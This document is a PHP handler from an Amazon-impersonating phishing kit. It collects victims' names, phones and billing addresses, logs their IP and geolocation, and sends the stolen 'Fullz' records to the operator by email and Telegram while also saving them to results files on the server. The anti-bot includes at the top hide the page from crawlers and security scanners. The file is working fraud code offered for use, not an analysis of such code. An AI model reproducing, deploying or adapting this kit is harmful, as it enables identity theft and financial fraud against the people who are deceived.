<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
include "../req/config.php";


function getip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};

function getlocisp($ip){
$getdetails = "https://extreme-ip-lookup.com/json/".$ip;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$a    = curl_exec($curl);
curl_close($curl);
$aj=json_decode($a);
$a=$aj->isp.' '.$aj->country;
return $a;};

function getloc($ip){
$getdetails = "https://ipinfo.io/".$ip."/geo";
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
return $content;};

if(isset($_POST['fname']) && isset($_POST['street']) && isset($_POST['state']) && isset($_POST['zip']) && isset($_POST['city'])){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$city = $_POST['city'];
		//$ssn = $_POST['ssn'];
		$phone = $_POST['phone'];
		$state = $_POST['state'];
		$zip_code = $_POST['zip'].$_SESSION['device'];
		$PublicIP = getip();
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
First Name       : $fullname  
Phone            : $phone 
Street Address   : $street_address 
City             : $city          
State            : $state		  
Zip/Postal Code  : $zip_code";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 💥 AMAZON BILLING | DEVICE' ;$headers = 'From: YoCHI <yochmnet@yochzon.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = $PublicIP.' 💥 AMAZON SESSION RESULT';$headers = 'From: YoCHI ️ <yochmnet@yochzon.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $_SESSION['fullz'], $headers);
		};
		
        if ($send_tg == 1 && isset($_SESSION['fullz'])) {
			sendtoTG($tgid, $_SESSION['fullz'], $tgtoken);
        };
		if(isset($_SESSION['fullz'])){
			$file = fopen("../../admin/Results.txt", 'a');
			fwrite($file, $_SESSION['fullz'].'r\n');
		fclose($file);};
		
		header("location:complete??sessionnI_IX=".md5(rand(100, 999999999)).'');
    }
    else{ header("location:billadd?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
?>